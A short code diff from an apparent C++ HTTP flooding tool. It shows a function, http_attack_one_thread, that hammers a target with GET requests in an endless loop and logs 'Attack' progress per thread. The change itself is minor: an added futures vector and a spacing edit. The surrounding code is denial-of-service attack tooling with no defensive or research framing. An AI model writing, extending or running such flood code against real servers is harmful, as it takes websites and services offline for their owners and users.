@@ -10,10 +10,11 @@ string version_name = "1.0 Public";
 void http_attack_one_thread(string number , string target , int j) {
     auto* httpRequests = new HttpRequests(target);
     try {
+        vector<future<string>> futures;
         if (number == "max") {
             int run_number = 0;
             while (true) {
-                httpRequests->GetRequest();
+                httpRequests -> GetRequest();
                 run_number += 1;
                 if (run_number % 1000 == 0) {
                     cout << "[INFO] Attack " << target << " Number: " << run_number << " Thread: " << j << endl;
